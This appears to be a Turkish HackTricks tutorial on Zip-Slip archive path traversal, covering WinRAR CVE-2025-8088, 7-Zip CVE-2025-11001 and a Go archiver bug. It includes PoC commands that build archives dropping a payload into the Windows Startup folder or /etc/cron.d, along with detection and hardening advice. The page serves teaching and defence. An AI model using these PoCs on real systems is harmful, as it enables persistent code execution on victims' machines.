# Arşiv Çıkarma Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Genel Bakış

Birçok arşiv formatı (ZIP, RAR, TAR, 7-ZIP, vb.) her girişe kendi **internal path**'ini taşıma izni verir. Bir çıkarma aracı bu yolu sorgusuz sualsiz uygularsa, `..` içeren veya bir **absolute path** (ör. `C:\Windows\System32\`) barındıran kötü amaçlı bir dosya adı, kullanıcının seçtiği dizinin dışına yazılacaktır.
Bu zafiyet sınıfı yaygın olarak *Zip-Slip* veya **archive extraction path traversal** olarak bilinir.

Sonuçlar, rastgele dosyaların üzerine yazılmasından Windows *Startup* klasörü gibi **auto-run** bir konuma payload bırakılarak doğrudan **remote code execution (RCE)** elde edilmesine kadar değişir.

## Kök Neden

1. Saldırgan, bir veya daha fazla dosya başlığının şunları içerdiği bir arşiv oluşturur:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Or crafted **symlinks** that resolve outside the target dir (common in ZIP/TAR on *nix*).
2. Kurban, gömülü yolu temizlemek veya çıkarımı seçilen dizinin altına zorlamak yerine, gömülü yoluna (veya symlinks'leri takip ederek) güvenen bir zafiyetli araçla arşivi çıkarır.
3. Dosya saldırganın kontrolündeki konuma yazılır ve sistem veya kullanıcı o yolu tetiklediğinde bir sonraki sefer çalıştırılır/yüklenir.

## Real-World Example – WinRAR ≤ 7.12 (CVE-2025-8088)

Windows için WinRAR ( `rar` / `unrar` CLI, DLL ve portable kaynak dahil) çıkarma sırasında dosya adlarını doğrulayamadı.
Aşağıdakine benzer bir giriş içeren kötü amaçlı bir RAR arşivi:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
seçilen çıktı dizininin **dışında** ve kullanıcının *Startup* klasörünün içinde sonlanır. Oturum açıldıktan sonra Windows orada bulunan her şeyi otomatik olarak çalıştırır, böylece *kalıcı* RCE sağlar.

### PoC Arşivi Oluşturma (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Kullanılan seçenekler:
* `-ep`  – dosya yollarını tam olarak verildiği gibi sakla (başındaki `./`'i **kırpmayın**).

evil.rar dosyasını hedefe gönderin ve zafiyetli bir WinRAR sürümüyle çıkarmalarını söyleyin.

### Vahşi Doğada Gözlemlenen Sömürü

ESET, RomCom (Storm-0978/UNC2596) hedef odaklı kimlik avı kampanyalarının RAR arşivleri ekleyerek CVE-2025-8088'i kötüye kullandığını; özelleştirilmiş backdoors dağıtmak ve ransomware operasyonlarını kolaylaştırmak için bu yöntemi kullandıklarını bildirdi.

## Daha Yeni Vakalar (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Hata**: ZIP girdilerindeki **symbolic links** çıkarma sırasında dereference ediliyordu; bu durum saldırganların hedef dizinden kaçmasına ve keyfi yollar üzerine yazmasına izin veriyordu. Kullanıcı etkileşimi sadece arşivi *açmak/çıkarmak*.
* **Etkilenen**: 7-Zip 21.02–24.09 (Windows & Linux sürümleri). **25.00** (Temmuz 2025) ve sonrası ile düzeltildi.
* **Etkilenme yolu**: `Start Menu/Programs/Startup` veya servis tarafından çalıştırılan konumların üzerine yazma → kod bir sonraki oturum açmada veya servis yeniden başlatıldığında çalışır.
* **Hızlı PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Düzeltilmiş bir sürümde `/etc/cron.d` etkilenmez; symlink /tmp/target içinde bir bağlantı olarak çıkarılır.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Hata**: `archiver.Unarchive()` `../` ve symlinked ZIP girdilerini takip ederek `outputDir` dışında yazma yapıyordu.
* **Etkilenen**: `github.com/mholt/archiver` ≤ 3.5.1 (proje artık kullanımdan kaldırıldı).
* **Çözüm**: `mholt/archives` ≥ 0.1.0'a geçin veya yazmadan önce canonical-path kontrolleri uygulayın.
* **Minimal yeniden üretme**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Tespit İpuçları

* **Statik inceleme** – Arşiv girdilerini listeleyin ve adı `../`, `..\\`, *absolute paths* (`/`, `C:`) içeren veya hedefi çıkarma dizini dışında olan *symlink* türündeki girdileri işaretleyin.
* **Kanonikleştirme** – `realpath(join(dest, name))`'in hâlâ `dest` ile başlamasını sağlayın. Aksi takdirde reddedin.
* **Sandbox içinde çıkarma** – *safe* bir çıkarıcı kullanarak (ör. `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) arşivi geçici bir dizine açın ve oluşan yolların dizin içinde kaldığını doğrulayın.
* **Uç nokta izlemesi** – WinRAR/7-Zip/… tarafından bir arşiv açıldıktan kısa süre sonra `Startup`/`Run`/`cron` konumlarına yeni yürütülebilir dosyalar yazıldığında uyarı verin.

## Önlemler ve Sertleştirme

1. **Çıkarıcıyı güncelleyin** – WinRAR 7.13+ ve 7-Zip 25.00+ yol/symlink sanitizasyonu uygular. Her iki araç da hâlâ otomatik güncellemeye sahip değil.
2. Mümkünse arşivleri “**Do not extract paths**” / “**Ignore paths**” seçenekleriyle çıkarın.
3. Unix'te ayrıcalıkları düşürün ve çıkarma öncesi bir **chroot/namespace** bağlayın; Windows'ta **AppContainer** veya bir sandbox kullanın.
4. Özel kod yazıyorsanız, oluşturma/yazmadan **önce** `realpath()`/`PathCanonicalize()` ile normalleştirme yapın ve hedef dizinden kaçan herhangi bir girişi reddedin.

## Ek Etkilenen / Tarihsel Vakalar

* 2018 – Snyk tarafından bildirilen büyük *Zip-Slip* uyarısı, birçok Java/Go/JS kütüphanesini etkiledi.
* 2023 – 7-Zip CVE-2023-4011: `-ao` birleştirme sırasında benzer traversal.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377): slugs'ta TAR çıkarma traversal (yama v1.2'de).
* Yazmadan önce `PathCanonicalize` / `realpath` çağırmayan herhangi bir özel çıkarma mantığı.

## Kaynaklar

- [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)

{{#include ../banners/hacktricks-training.md}}
